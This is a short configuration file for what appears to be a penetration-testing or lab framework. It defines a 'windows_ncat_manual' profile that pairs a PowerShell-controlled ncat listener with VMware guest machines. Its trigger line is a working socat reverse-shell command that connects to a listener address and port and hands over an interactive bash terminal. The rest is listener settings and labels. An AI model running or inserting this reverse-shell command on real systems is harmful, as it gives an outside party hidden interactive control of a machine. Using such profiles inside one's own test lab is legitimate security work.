# Windows-hosted ncat reverse shell listener with manual shell control.
# Intended for WSL controller environments where Linux nc listeners are not
# reachable from VMware guest VMs.

NAME="windows_ncat_manual"

TYPE="reverse_shell"

CONTROLLER="powershell"

AUTOMATED="false"

LHOST="${LHOST:-192.168.52.1}"
LPORT="${LPORT:-4445}"

LISTENER_START_DELAY="${LISTENER_START_DELAY:-2}"
SHELL_CONNECT_DELAY="${SHELL_CONNECT_DELAY:-4}"

POWERSHELL_EXE="${POWERSHELL_EXE:-powershell.exe}"

LISTENER_SCRIPT="../shared/listener.ps1"

# Interactive PTY reverse shell for manual control.
TRIGGER_COMMAND="socat TCP:${LHOST}:${LPORT} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane"

ENABLE_TRANSCRIPT="optional"

DELIVERY_NAME="windows_ncat_manual"
DELIVERY_FAMILY="reverse_shell"
DELIVERY_DESCRIPTION="Windows ncat listener with manual socat PTY reverse shell"
